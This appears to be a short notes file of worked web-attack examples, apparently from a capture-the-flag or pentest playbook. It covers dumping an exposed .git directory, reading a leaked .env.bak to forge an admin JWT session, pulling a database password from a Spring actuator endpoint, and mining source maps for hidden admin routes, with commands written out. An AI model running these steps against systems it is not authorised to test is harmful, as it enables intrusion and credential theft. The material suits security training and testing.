# Worked examples — the numbers



## .git recovery

1. `curl -s $BASE/.git/HEAD` → `ref: refs/heads/main` — real.
2. `git clone --no-checkout` fails (no smart protocol).
3. `git_dumper.py --base $BASE/.git/ --out repo` → walks HEAD→commit→tree→blobs, ~340 objects, writes the tree.
4. `grep -rn 'flag{' repo/` → found in a deleted commit's config file.

## .env to session forge

1. `/env` 403; `/.env.bak` 200: `JWT_SECRET=...`, `DB_URL=...`.
2. JWT secret → `web-auth-session` forge path → admin session.

## actuator env to DB

1. `/actuator` → link list including `/env`, `/heapdump`.
2. `/actuator/env` → `spring.datasource.password`.
3. Cred → login/db chain.

## .map to endpoint map

1. bundle.js comment → `//# sourceMappingURL=app.js.map`.
2. `bundle_miner.py --url $BASE --out mined/` → 214 sources.
3. `grep -rn 'api/' mined/` → internal `/admin/export` route → probe.


## Falsifier

--

## Cross-references

`case-studies.md`
